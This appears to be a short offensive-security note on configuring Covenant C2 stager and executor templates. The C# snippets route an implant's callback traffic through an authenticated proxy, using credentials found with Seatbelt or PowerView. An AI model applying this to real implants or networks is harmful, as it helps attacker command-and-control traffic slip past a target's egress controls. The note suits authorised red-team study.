#Find users privileges to proxy server - use Seatbelt or PowerView then make a Template Covenant

StagerCode

wc.UseDefaultCredentials = false;
wc.Proxy = new WebProxy
{
    Address = new Uri("http://target:port"),
    Credentials = new NetworkCredential
    {
        Domain = "DOMAIN",
        UserName = "USER",
        Password = "PASSWORD"
    }
};

 ExecutorCode
 
 this.CovenantClient.UseDefaultCredentials = false;
this.CovenantClient.Proxy = new WebProxy
{
    Address = new Uri("http://target:port"),
    Credentials = new NetworkCredential
    {
        Domain = "DOMAIN",
        UserName = "USER",
        Password = "PASSWORD"
    }
};
 
 
 




